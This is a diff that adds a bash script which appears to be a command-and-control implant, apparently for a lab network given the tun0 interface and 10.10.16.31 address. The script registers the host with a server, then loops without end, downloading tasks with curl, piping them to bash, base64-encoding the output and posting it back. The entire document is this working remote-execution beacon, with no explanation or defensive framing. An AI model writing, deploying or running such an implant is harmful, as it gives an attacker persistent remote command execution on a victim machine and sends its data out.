@@ -1,0 +1,37 @@
+#!/bin/bash
+ip="10.10.16.31"
+port="8000"
+interface="tun0"
+n=.3
+
+regl="http://$ip:$port/reg/"
+
+declare -A data=( [eth]=$interface [hname]=$(hostname) )
+
+name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 
+
+taskl="http://$ip:$port/tasks/$name/"
+resultl="http://$ip:$port/Lin-results/$name/"
+
+while :
+do  
+	# tasks=0
+    curl $taskl > /tmp/tasks
+
+    # if [ -z "$tasks" ] 
+    splittasks=$(cat /tmp/tasks | tr ";" "\n")
+	while IFS= read -r line 
+	do
+		printf '%s\n' "$line" >> /tmp/tmp
+	done <<< $splittasks
+	cat /tmp/tmp|uniq -u > /tmp/tmps
+
+    cat /tmp/tmps|bash >> /tmp/result
+    base64 /tmp/result > /tmp/enc-result 
+    # sleep $n
+    curl -X POST --data "@/tmp/enc-result" $resultl
+    rm /tmp/result
+    rm /tmp/tmp
+	    
+done
+
